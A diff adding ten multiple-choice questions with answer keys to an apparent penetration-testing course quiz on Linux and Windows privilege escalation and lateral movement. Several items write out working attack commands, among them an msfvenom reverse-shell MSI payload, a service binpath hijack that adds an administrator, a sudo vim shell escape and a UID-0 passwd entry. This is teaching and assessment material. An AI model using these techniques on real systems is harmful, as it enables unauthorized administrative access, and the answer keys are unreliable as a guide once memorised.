@@ -220,4 +220,206 @@ A penetration tester uses the LOLBAS technique with `certutil.exe` on a compromi
 
 ---
 
+---
+
+**Question 11**
+
+A tester on a compromised Linux host runs `cat /etc/crontab` and finds: `* * * * * root /tmp/cleanup.sh`. The file `/tmp/cleanup.sh` is world-writable. What privilege escalation path does this create?
+
+- A) The tester can modify cleanup.sh to execute commands as root because cron runs it every minute with root privileges and the script is writable by any user
+- B) The tester can only read the script contents since cron jobs execute in a sandboxed environment
+- C) This is not exploitable because `/tmp` is mounted with `noexec` on all modern Linux distributions
+- D) The tester must wait for the next reboot to trigger the cron job with elevated privileges
+
+**Correct Answer:** A) The tester can modify cleanup.sh to execute commands as root because cron runs it every minute with root privileges and the script is writable by any user
+
+**Distractor Analysis:**
+
+- *Why A is correct:* When a cron job runs as root and executes a world-writable script, any user on the system can append to or replace the script content with arbitrary commands. Those commands will execute as root within 60 seconds (one cron cycle). Adding a reverse shell one-liner to the script provides immediate root access. This is a direct privilege escalation path documented in both manual and automated enumeration tools like LinPEAS.
+- *Why B is incorrect:* Cron jobs do not run in a sandbox. They execute with the full privileges of the specified user (root in this case) and with full access to the file system. There is no isolation between cron execution and the rest of the system.
+- *Why C is incorrect:* While some systems mount `/tmp` with `noexec`, this is not universal. Even where `noexec` is set, a bash script can still be executed via the shell interpreter (`bash /tmp/cleanup.sh`) rather than direct execution. The script content can be modified regardless of `noexec`.
+- *Why D is incorrect:* Cron runs continuously while the system is powered on. The `* * * * *` schedule means the job executes every minute — no reboot is required. The tester only needs to wait up to 60 seconds after modifying the script.
+
+---
+
+**Question 12**
+
+A Windows tester runs `accesschk.exe -uwcqv "Everyone" *` and discovers that the `Everyone` group has `SERVICE_CHANGE_CONFIG` permission on a service named `WeakSvc`. What exploitation technique is enabled by this finding?
+
+- A) The tester can stop and restart the service but cannot modify its configuration
+- B) The tester can use `sc config WeakSvc binpath= "cmd /c net localgroup administrators attacker /add"` to change the service binary path to an attacker-controlled command, then restart the service to execute it as SYSTEM
+- C) `SERVICE_CHANGE_CONFIG` only allows changing the service description — it cannot modify the binary path
+- D) This permission enables DLL hijacking but not direct binary path modification
+
+**Correct Answer:** B) The tester can use `sc config WeakSvc binpath= "cmd /c net localgroup administrators attacker /add"` to change the service binary path to an attacker-controlled command, then restart the service to execute it as SYSTEM
+
+**Distractor Analysis:**
+
+- *Why B is correct:* `SERVICE_CHANGE_CONFIG` allows modification of all service configuration parameters including `binpath`. By replacing the binary path with a command that adds a user to the local administrators group (or drops a shell), the tester causes Windows to execute that command under the service account when the service starts. If the service runs as SYSTEM (common), this grants immediate administrative access.
+- *Why A is incorrect:* `SERVICE_CHANGE_CONFIG` grants configuration modification rights, which includes the binary path — it is not limited to start/stop operations. Stop and restart permissions are controlled by separate access rights (`SERVICE_STOP`, `SERVICE_START`).
+- *Why C is incorrect:* `SERVICE_CHANGE_CONFIG` is a broad permission that allows modifying all configuration fields including binary path, start type, account, and description. It is not limited to descriptions only.
+- *Why D is incorrect:* DLL hijacking exploits the DLL search order when an application loads DLLs. `SERVICE_CHANGE_CONFIG` exploitation directly replaces the binary path — it is not a DLL hijacking technique.
+
+---
+
+**Question 13**
+
+During a Windows privilege escalation assessment, a tester discovers the registry keys `HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated` and `HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated` are both set to `1`. What attack does this enable?
+
+- A) The tester can install any MSI package with SYSTEM privileges, regardless of the current user's privilege level — typically exploited by generating a malicious MSI with msfvenom and installing it
+- B) Both keys set to `1` indicates the system is fully patched and MSI installations are blocked
+- C) The tester can only elevate privileges for signed MSI packages from trusted publishers
+- D) `AlwaysInstallElevated` only affects installations run from the command line, not double-click installations
+
+**Correct Answer:** A) The tester can install any MSI package with SYSTEM privileges, regardless of the current user's privilege level — typically exploited by generating a malicious MSI with msfvenom and installing it
+
+**Distractor Analysis:**
+
+- *Why A is correct:* When both HKLM and HKCU keys are set to 1, Windows allows any user to install MSI packages with elevated (SYSTEM) privileges. This policy is intended to allow standard users to install software but creates a critical privilege escalation path. The attack: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=4444 -f msi -o shell.msi` then `msiexec /quiet /qn /i shell.msi`. Both keys must be set to 1 — if only one is set, the escalation does not work.
+- *Why B is incorrect:* Both keys set to 1 enables the privilege escalation — it does not indicate patching or blocking. This is a deliberate but dangerous policy configuration.
+- *Why C is incorrect:* `AlwaysInstallElevated` does not restrict escalation to signed packages. Any MSI — including attacker-generated ones — runs with SYSTEM privileges when this policy is active.
+- *Why D is incorrect:* `AlwaysInstallElevated` applies to all MSI installations regardless of how they are initiated — double-click, command line, or scripted. The escalation works through any MSI execution path.
+
+---
+
+**Question 14**
+
+A tester with a low-privilege shell on a Windows host runs `systeminfo` and identifies the OS as Windows Server 2016 with no patches applied since 2019. Which next step best identifies exploitable local privilege escalation paths?
+
+- A) Run `whoami /priv` and then use Metasploit's `local_exploit_suggester` against the current session to identify applicable kernel and local privilege escalation exploits
+- B) Run `netstat -an` to identify active network connections, then exploit the most recently established connection
+- C) Run `dir C:\` to enumerate all files and immediately look for sensitive documents
+- D) Run `ipconfig /all` to identify network interfaces, then scan adjacent subnets for lateral movement targets
+
+**Correct Answer:** A) Run `whoami /priv` and then use Metasploit's `local_exploit_suggester` against the current session to identify applicable kernel and local privilege escalation exploits
+
+**Distractor Analysis:**
+
+- *Why A is correct:* `whoami /priv` reveals currently enabled and disabled privileges that can be abused (SeImpersonatePrivilege, SeDebugPrivilege, SeBackupPrivilege). An unpatched 2016 server is potentially vulnerable to multiple kernel-level CVEs. The `local_exploit_suggester` cross-references the OS version and patch level against Metasploit's exploit database to identify specific applicable modules. This is the systematic approach to local privilege escalation enumeration.
+- *Why B is incorrect:* `netstat -an` reveals network connections and is useful for lateral movement planning — it does not directly identify local privilege escalation paths. Active connections cannot be "exploited" as a local escalation technique.
+- *Why C is incorrect:* Directory enumeration for sensitive documents is a data collection activity, not privilege escalation. It is performed after escalating privileges, not as a method to achieve escalation.
+- *Why D is incorrect:* Network interface enumeration and lateral movement are post-privilege-escalation activities. Before moving laterally, the tester should first maximize privilege on the current host to maximize the value of further actions.
+
+---
+
+**Question 15**
+
+A Linux tester with a shell as `www-data` runs `sudo -l` and sees: `(root) NOPASSWD: /usr/bin/vim`. According to GTFOBins, how can this be exploited to spawn a root shell?
+
+- A) `sudo vim -c '!sh'` — vim's command mode can execute shell commands; running it with sudo grants the shell root privileges
+- B) `sudo vim /etc/shadow` — editing the shadow file directly resets the root password
+- C) `sudo vim --root-shell /bin/bash` — vim has a built-in privilege escalation flag
+- D) This cannot be exploited because vim only edits files and cannot spawn processes
+
+**Correct Answer:** A) `sudo vim -c '!sh'` — vim's command mode can execute shell commands; running it with sudo grants the shell root privileges
+
+**Distractor Analysis:**
+
+- *Why A is correct:* Vim's command mode (entered with `:`) can execute shell commands via `!command`. Running `sudo vim -c '!sh'` starts vim with root privileges (via sudo) and immediately executes `!sh` through vim's command mode, spawning a root shell. GTFOBins documents this and dozens of similar editor-based escalation paths. The key insight is that any program that can invoke a shell inherits the permissions it was launched with.
+- *Why B is incorrect:* While editing `/etc/shadow` with root-privileged vim could modify password hashes, this is not the standard exploitation path for a GTFOBins sudo vim finding. It would require knowledge of password hash generation and is more complex than simply spawning a shell.
+- *Why C is incorrect:* `--root-shell` is not a valid vim flag. Vim does not have built-in privilege escalation options.
+- *Why D is incorrect:* Vim can absolutely spawn processes through its command mode (`:!command`) and shell (`:shell`). The ability to execute shell commands is a core vim feature that creates the escalation path when vim is run with elevated privileges.
+
+---
+
+**Question 16**
+
+A tester discovers that a running Windows service binary path points to `C:\Program Files\Custom App\service.exe` without quotation marks around the path. The tester confirms write access to `C:\`. What is the exploitation sequence?
+
+- A) Create `C:\Program.exe` containing a malicious payload; when the service starts or restarts, Windows executes `C:\Program.exe` before reaching the legitimate binary because it parses the unquoted path left-to-right at each space
+- B) Replace `C:\Program Files\Custom App\service.exe` directly with a malicious binary
+- C) Create a DLL named `service.dll` in `C:\Program Files\Custom App\` to intercept the service's DLL loading
+- D) Modify the service's registry key at `HKLM\SYSTEM\CurrentControlSet\Services\CustomApp\ImagePath` using regedit
+
+**Correct Answer:** A) Create `C:\Program.exe` containing a malicious payload; when the service starts or restarts, Windows executes `C:\Program.exe` before reaching the legitimate binary because it parses the unquoted path left-to-right at each space
+
+**Distractor Analysis:**
+
+- *Why A is correct:* Windows parses unquoted service paths by attempting to execute each space-delimited prefix as a potential executable. For `C:\Program Files\Custom App\service.exe`, Windows tries: `C:\Program.exe`, then `C:\Program Files\Custom.exe`, then `C:\Program Files\Custom App\service.exe`. Placing a malicious `Program.exe` in `C:\` (if writable) causes Windows to execute it instead of the legitimate service binary. This executes with the service account's privileges.
+- *Why B is incorrect:* Directly replacing the service binary requires write access to `C:\Program Files\Custom App\` — not just `C:\`. If the tester had write access to the service directory, a different exploitation approach would apply. The unquoted path technique only requires write access to a parent directory.
+- *Why C is incorrect:* DLL hijacking involves the DLL search order, not the service binary path parsing. It requires the service binary to load DLLs without full paths. This is a separate technique from unquoted service paths.
+- *Why D is incorrect:* Modifying the registry `ImagePath` directly would require `SERVICE_CHANGE_CONFIG` permission on the service object, which is a different privilege escalation technique (weak service permissions). Write access to `C:\` does not grant registry key write access.
+
+---
+
+**Question 17**
+
+After dumping NTLM hashes from LSASS on a Windows host with Mimikatz, a tester attempts to use the Administrator hash to authenticate to other Windows hosts on the network using CrackMapExec. Three out of eight hosts respond with `[+]`. The other five respond with `[-]`. What does the `[-]` response on five hosts most likely indicate?
+
+- A) The five hosts are offline and not responding to network requests
+- B) The five hosts have different local administrator passwords, meaning the hashes do not match — this is good security practice (Local Administrator Password Solution or unique passwords per system)
+- C) The five hosts are running Linux and NTLM authentication is not supported
+- D) CrackMapExec requires Domain Administrator hashes — local administrator hashes always fail
+
+**Correct Answer:** B) The five hosts have different local administrator passwords, meaning the hashes do not match — this is good security practice (Local Administrator Password Solution or unique passwords per system)
+
+**Distractor Analysis:**
+
+- *Why B is correct:* A `[-]` response in CrackMapExec indicates authentication failure — the hash did not match. Five hosts rejecting the same administrator hash while three accepted it indicates those five systems have unique local administrator passwords. This is the expected result when Microsoft's Local Administrator Password Solution (LAPS) or a similar policy is enforced. The three hosts that accepted the hash reveal a password reuse vulnerability; the five that rejected it demonstrate proper password management.
+- *Why A is incorrect:* CrackMapExec distinguishes between unreachable hosts (connection errors, timeouts) and authentication failures. A `[-]` specifically indicates a response was received but authentication was denied — the host is online.
+- *Why C is incorrect:* The scenario describes Windows hosts on an internal network. Linux systems do not expose SMB NTLM authentication endpoints that CrackMapExec tests against in its default SMB mode.
+- *Why D is incorrect:* CrackMapExec with `--local-auth` specifically uses local account authentication, bypassing domain controllers. Local administrator hashes absolutely work for local authentication — the three `[+]` responses prove this.
+
+---
+
+**Question 18**
+
+A tester finds that a Linux system has `/etc/passwd` writable by the current user (a significant misconfiguration). What exploitation technique directly leverages this to gain root access?
+
+- A) Delete the root entry from `/etc/passwd` to trigger a system error that grants emergency root access
+- B) Add a new entry to `/etc/passwd` with UID 0 and a known password hash: `attacker:$1$salt$hash:0:0:root:/root:/bin/bash` — then authenticate as `attacker` to gain a root shell
+- C) Replace the root username with the current user's name to inherit root privileges
+- D) Writable `/etc/passwd` only allows reading the file — write operations require `sudo`
+
+**Correct Answer:** B) Add a new entry to `/etc/passwd` with UID 0 and a known password hash: `attacker:$1$salt$hash:0:0:root:/root:/bin/bash` — then authenticate as `attacker` to gain a root shell
+
+**Distractor Analysis:**
+
+- *Why B is correct:* On traditional Unix systems, `/etc/passwd` can store password hashes directly (the 'x' in modern systems means the hash is in `/etc/shadow`). If `/etc/passwd` is writable, the tester can add a new user with UID 0 (root-equivalent) and a known password hash. The pre-generated hash for a known password (created with `openssl passwd -1 "password"`) allows the tester to then `su attacker` with the known password, obtaining a root shell.
+- *Why A is incorrect:* Deleting the root entry from `/etc/passwd` would break root authentication and potentially destabilize the system — it does not grant access and is a destructive action that violates professional engagement standards.
+- *Why C is incorrect:* The privilege level is determined by the UID (0 = root), not by the username string. Changing the root username does not change the current user's UID or grant them root privileges.
+- *Why D is incorrect:* The entire premise of this question is that `/etc/passwd` is writable by the current user. If write access exists, write operations can be performed without sudo. The misconfiguration is precisely that write access exists when it should not.
+
+---
+
+**Question 19**
+
+During a Windows assessment, a tester identifies that the `SeImpersonatePrivilege` token privilege is enabled for the current session (running as `NT AUTHORITY\NETWORK SERVICE`). Which class of attack does this enable?
+
+- A) Kerberoasting — the privilege allows requesting service tickets for all SPNs in the domain
+- B) Token impersonation attacks such as PrintSpoofer or Potato exploits — SeImpersonatePrivilege allows the process to impersonate a client after authentication, which these exploits leverage to impersonate SYSTEM-level tokens
+- C) Pass-the-hash — the privilege provides access to NTLM hashes stored in LSASS memory
+- D) DLL injection — the privilege allows loading arbitrary DLLs into privileged processes
+
+**Correct Answer:** B) Token impersonation attacks such as PrintSpoofer or Potato exploits — SeImpersonatePrivilege allows the process to impersonate a client after authentication, which these exploits leverage to impersonate SYSTEM-level tokens
+
+**Distractor Analysis:**
+
+- *Why B is correct:* `SeImpersonatePrivilege` is commonly held by service accounts (IIS, SQL Server, NETWORK SERVICE) and allows a process to impersonate tokens from clients that connect to it. Potato exploits (JuicyPotato, RoguePotato, SweetPotato) and PrintSpoofer abuse this by coercing SYSTEM to authenticate to the attacker's named pipe/listener, capturing the SYSTEM token, and using `SeImpersonatePrivilege` to impersonate it — resulting in code execution as SYSTEM.
+- *Why A is incorrect:* Kerberoasting requests service tickets for accounts with SPNs, requiring only a valid domain user account. It does not require `SeImpersonatePrivilege` and targets domain authentication, not local token impersonation.
+- *Why C is incorrect:* Pass-the-hash uses captured NTLM hashes for authentication. Accessing LSASS requires `SeDebugPrivilege` — not `SeImpersonatePrivilege`. These are different token privileges for different attack techniques.
+- *Why D is incorrect:* DLL injection requires different capabilities including process memory write access and specific API calls. `SeImpersonatePrivilege` is specifically for token impersonation after a client authenticates, not for DLL loading into other processes.
+
+---
+
+**Question 20**
+
+A post-exploitation assessment reveals that an organization uses the same local administrator password across all 500 Windows workstations. A tester confirms this via pass-the-hash authentication to 12 sampled hosts. What is the appropriate finding documentation and remediation recommendation?
+
+- A) Document as a single "Credential Reuse" finding of Medium severity — shared passwords are a minor issue in enterprise environments
+- B) Document as a Critical finding demonstrating that credential compromise of a single workstation enables immediate lateral movement to all 500 hosts; recommend implementing Microsoft's Local Administrator Password Solution (LAPS) or a third-party PAM solution to enforce unique, rotated local administrator passwords per system
+- C) Document the 12 confirmed hosts only — the other 488 hosts are out of scope since they were not directly tested
+- D) Report as an Informational finding since the administrator account is a local account and cannot be used for domain privilege escalation
+
+**Correct Answer:** B) Document as a Critical finding demonstrating that credential compromise of a single workstation enables immediate lateral movement to all 500 hosts; recommend implementing Microsoft's Local Administrator Password Solution (LAPS) or a third-party PAM solution to enforce unique, rotated local administrator passwords per system
+
+**Distractor Analysis:**
+
+- *Why B is correct:* Uniform local administrator credentials across an entire fleet is a Critical finding because it eliminates all containment from a single host compromise. An attacker who compromises any one workstation immediately gains administrative access to all 500. The business impact — complete lateral movement across the entire endpoint fleet — is clearly Critical. LAPS is Microsoft's purpose-built solution that automatically generates, stores, and rotates unique local administrator passwords per machine in Active Directory.
+- *Why A is incorrect:* Medium severity dramatically underrepresents the impact. Uniform credentials enabling 500-host lateral movement from a single compromise is a Critical-level finding with direct, demonstrable business impact.
+- *Why C is incorrect:* The finding's scope is the systemic vulnerability (uniform passwords across the fleet), not merely the 12 sampled hosts. The 12 hosts are representative samples — the finding applies to all 500. Limiting documentation to tested hosts would underrepresent the actual risk.
+- *Why D is incorrect:* Local administrator credentials can absolutely be used for lateral movement within the environment, as demonstrated by the pass-the-hash test against 12 hosts. Local admin access also enables credential dumping, which can yield domain credentials from cached logons.
+
+---
+
 *End of Module 12 Quiz*
